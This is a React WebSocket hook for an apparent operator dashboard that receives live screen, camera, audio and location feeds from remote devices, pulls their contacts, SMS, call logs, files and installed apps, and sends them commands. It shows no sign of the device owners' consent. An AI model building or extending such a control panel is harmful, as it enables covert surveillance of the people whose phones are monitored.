import React, { useState, useEffect, useCallback, useRef } from 'react';

/**
 * useWebSocket — manages connection to signaling server.
 * Receives device list, status updates, screen frames, camera frames,
 * audio data, and location data.
 */
export default function useWebSocket(serverUrl, token) {
  const [connected, setConnected] = useState(false);
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [deviceStatus, setDeviceStatus] = useState({});
  const [screenFrame, setScreenFrame] = useState(null);
  const [cameraFrame, setCameraFrame] = useState(null);
  const [location, setLocation] = useState(null);
  const [lastData, setLastData] = useState(null);

  const wsRef = useRef(null);
  const binaryTarget = useRef(null);
  const reconnectTimer = useRef(null);
  const delay = useRef(1000);
  const selectedDeviceRef = useRef(null);
  selectedDeviceRef.current = selectedDevice;

  const connect = useCallback(() => {
    if (!serverUrl || !token) return;
    const ws = new WebSocket(
      serverUrl.replace('http', 'ws') + `/ws?role=dashboard&token=${token}`
    );
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
      setConnected(true);
      delay.current = 1000;
    };

    ws.onmessage = (e) => {
      if (typeof e.data === 'string') {
        const msg = JSON.parse(e.data);
        handleJson(msg);
      } else {
        handleBinary(e.data);
      }
    };

    ws.onclose = () => {
      setConnected(false);
      reconnectTimer.current = setTimeout(() => {
        delay.current = Math.min(delay.current * 2, 30000);
        connect();
      }, delay.current);
    };

    ws.onerror = () => {};
    wsRef.current = ws;
  }, [serverUrl, token]);

  const handleJson = useCallback((msg) => {
    switch (msg.type) {
      case 'devices':
        setDevices(msg.devices || []);
        break;
      case 'deviceConnected':
        setDevices((prev) => {
          const exists = prev.find((d) => d.deviceId === msg.deviceId);
          if (exists) return prev.map((d) => d.deviceId === msg.deviceId ? { ...d, ...msg } : d);
          return [...prev, { deviceId: msg.deviceId, deviceName: msg.deviceName, deviceInfo: msg.deviceInfo, connectedAt: msg.connectedAt || Date.now() }];
        });
        break;
      case 'deviceDisconnected':
        setDevices((prev) => prev.filter((d) => d.deviceId !== msg.deviceId));
        if (selectedDeviceRef.current === msg.deviceId) setSelectedDevice(null);
        break;
      case 'status':
        setDeviceStatus((prev) => ({ ...prev, [msg.deviceId]: msg }));
        break;
      case 'location':
        setLocation(msg);
        break;
      case 'screenFrame':
        binaryTarget.current = 'screen';
        break;
      case 'cameraFrame':
        binaryTarget.current = 'camera';
        break;
      case 'webrtc_offer':
      case 'webrtc_answer':
      case 'webrtc_ice':
        setWebrtcSignals(msg);
        break;
      case 'contacts':
      case 'sms':
      case 'callLogs':
      case 'files':
      case 'deviceInfo':
      case 'installedApps':
        setLastData(msg);
        break;
      default:
        break;
    }
  }, []);

  const handleBinary = useCallback((buffer) => {
    const target = binaryTarget.current;
    const blob = new Blob([buffer], { type: 'image/jpeg' });
    const url = URL.createObjectURL(blob);

    if (target === 'screen') {
      setScreenFrame((prev) => { if (prev) URL.revokeObjectURL(prev); return url; });
    } else if (target === 'camera') {
      setCameraFrame((prev) => { if (prev) URL.revokeObjectURL(prev); return url; });
    } else if (target === 'audio') {
      playPcm(buffer);
    }
    binaryTarget.current = null;
  }, []);

  const playPcm = (buffer) => {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const i16 = new Int16Array(buffer);
      const f32 = new Float32Array(i16.length);
      for (let i = 0; i < i16.length; i++) f32[i] = i16[i] / 32768;
      const ab = ctx.createBuffer(1, f32.length, 16000);
      ab.getChannelData(0).set(f32);
      const src = ctx.createBufferSource();
      src.buffer = ab;
      src.connect(ctx.destination);
      src.start();
    } catch (e) { /* ignore */ }
  };

  const send = useCallback((action, payload = {}, targetDevice) => {
    if (!wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return;
    wsRef.current.send(JSON.stringify({
      type: 'command',
      targetDeviceId: targetDevice || selectedDeviceRef.current,
      payload: { action, ...payload },
    }));
  }, []);

  const refreshDevices = useCallback(() => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({ type: 'getDevices' }));
    }
  }, []);

  useEffect(() => {
    connect();
    return () => {
      wsRef.current?.close();
      clearTimeout(reconnectTimer.current);
    };
  }, [connect]);

  // Heartbeat
  useEffect(() => {
    if (!connected) return;
    const iv = setInterval(() => {
      wsRef.current?.send?.(JSON.stringify({ type: 'ping' }));
    }, 15000);
    return () => clearInterval(iv);
  }, [connected]);

  // Expose wsRef for WebRTC hook to send signaling messages
  const sendRaw = useCallback((msg) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(typeof msg === 'string' ? msg : JSON.stringify(msg));
    }
  }, []);

  // Handle WebRTC signaling messages from device
  const [webrtcSignals, setWebrtcSignals] = useState(null);
  useEffect(() => {
    if (lastData && lastData.type?.startsWith('webrtc_')) {
      setWebrtcSignals(lastData);
    }
  }, [lastData]);

  return {
    connected, devices, selectedDevice, setSelectedDevice,
    deviceStatus, screenFrame, cameraFrame, location, lastData,
    send, refreshDevices, sendRaw, wsRef, webrtcSignals,
  };
}
